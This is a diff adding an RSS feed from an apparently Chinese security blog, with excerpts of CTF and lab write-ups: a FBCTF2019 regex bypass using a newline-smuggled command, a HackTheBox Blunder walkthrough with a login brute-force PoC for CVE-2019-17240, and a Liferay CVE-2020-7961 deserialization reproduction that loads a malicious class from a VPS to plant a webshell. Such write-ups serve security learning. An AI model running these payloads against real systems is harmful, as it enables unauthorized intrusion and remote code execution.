@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CVE on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/cve/</link>
+    <description>Recent content in CVE on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 23 Sep 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/cve/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>BUUOJ刷题记录(3)</title>
+      <link>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</link>
+      <pubDate>Wed, 23 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</guid>
+      <description>[FBCTF2019]RCEService 考点：%0a绕过正则匹配，绝对路径调用系统命令
+要求用json传入cmd参数RCE，但是只给了ls命令其他的都不给
+比赛的时候应该是给了源码：
+&amp;lt;?phpputenv(&#39;PATH=/home/rceservice/jail&#39;);if (isset($_REQUEST[&#39;cmd&#39;])) {$json = $_REQUEST[&#39;cmd&#39;];if (!is_string($json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} else {echo &#39;Attempting to run command:&amp;amp;lt;br/&amp;amp;gt;&#39;;$cmd = json_decode($json, true)[&#39;cmd&#39;];if ($cmd !== NULL) {system($cmd);} else {echo &#39;Invalid input&#39;;}echo &#39;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;}}?&amp;gt;正则匹配的时候没有用m修饰符(换行匹配)，所以我们可以用%0a来绕过
+然后他设置了PATH=/home/rceservice/jail，这个目录下只有ls一个命令，想要调用其他系统命令我们还要传入绝对路径，比如/bin/cat。
+flag在PATH的上级目录。
+?cmd={%0A&amp;quot;cmd&amp;quot;:&amp;quot;/bin/cat /home/rceservice/flag&amp;quot;%0A}[GYCTF2020]FlaskApp 考点：flaskSSTI、pin码
+referer：https://blog.csdn.net/Alexhcf/article/details/108400293
+从base64解码发现SSTI 题目最开始给了两个页面，一个是base64加密、一个是base64解密
+在base64解密的页面如果解密出现错误的话，会开启debug
+而且在base64解密的页面发现了模板注入，传入{{config}}的base64编码会看到以下界面：</description>
+    </item>
+    
+    <item>
+      <title>HackTheBox::Blunder</title>
+      <link>https://anthem-whisper.github.io/p/hacktheboxblunder/</link>
+      <pubDate>Thu, 16 Jul 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/hacktheboxblunder/</guid>
+      <description>玩一手HTB
+ 打开靶机就一些无关紧要的文字，dirsearch扫一下目录可以扫到登录后台，我们可以发现靶机使用了 Bludit cms
+在看了一些Bludit的漏洞之后，发现在没有登录、我们又只有一个后台地址的情况下，弱口令比较靠谱
+CVE-2019-17240 Bludit是一套开源的轻量级博客内容管理系统（CMS）。
+Bludit 3.9.2版本中的 bl-kernel/security.class.php 一些代码将检查主机进行的错误登录尝试次数。如果主机进行10次不正确的尝试，则会暂时阻止它们，以减轻暴力破解的企图。攻击者通过使用多个伪造的X-Forwarded-For或Client-IP HTTP标头利用该漏洞绕过保护机制。
+爆破了半天，无果。
+看了wp之后，我们找到了本来没有被dirsearch扫到的/todo.txt：
+-Update the CMS-Turn off FTP - DONE-Remove old users - DONE-Inform fergus that the new blog needs images - PENDING可以猜到用户名可能是 fergus ，但是密码需要用到cewl来生成弱口令字典
+cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/然后我们利用改装过后的CVE-2019-17240的poc来打：
+#!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host + &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist.</description>
+    </item>
+    
+    <item>
+      <title>CVE-2020-7961 Liferay Portal 反序列化-复现</title>
+      <link>https://anthem-whisper.github.io/p/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 15 Jun 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞说明 Liferay是一个开源的Portal产品,提供对多个独立系统的内容集成,为企业信息、流程等的整合提供了一套完整的解决方案,和其他商业产品相比,Liferay有着很多优良的特性,而且免费,在全球都有较多用户。该漏洞是个反序列化导致的RCE，通过未授权访问其api传递json数据进行反序列化，危害较高
+影响范围 Liferay Portal 6.1、6.2、7.0、7.1、7.2
+环境搭建 漏洞环境：
+windows 10
+jre1.8.0_221
+jdk1.8.0_221
+tomcat集成包：https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1 （我用的liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz）
+启动环境 E:\tmp\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\liferay-portal-7.2.0-ga1\tomcat-9.0.17\bin&amp;gt; .\catalina.bat run访问 http://localhost:8080/ 全部默认配置就可以
+漏洞利用 思路：构造恶意class文件-&amp;gt;构造序列化-&amp;gt;反序列化-&amp;gt;加载VPS上面恶意evil.class文件-&amp;gt;实现下载webshell
+构造恶意class文件 在VPS上面创建 LifExp.java（该写法为目标是Windows，运行计算器）-&amp;gt;编译class文件
+public class LifExp { static { try { String[] cmd = {&amp;quot;cmd.exe&amp;quot;, &amp;quot;/c&amp;quot;, &amp;quot;calc.exe&amp;quot;};//命令执行java.lang.Runtime.getRuntime().exec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } }使用 javac .\LifExp.java 生成class文件
+在当前目录使用 python -m SimpleHTTPServer 8000 监听8000端口启动一个wbe服务
+构造序列化 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 文件进行序列化：
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.</description>
+    </item>
+    
+  </channel>
+</rss>
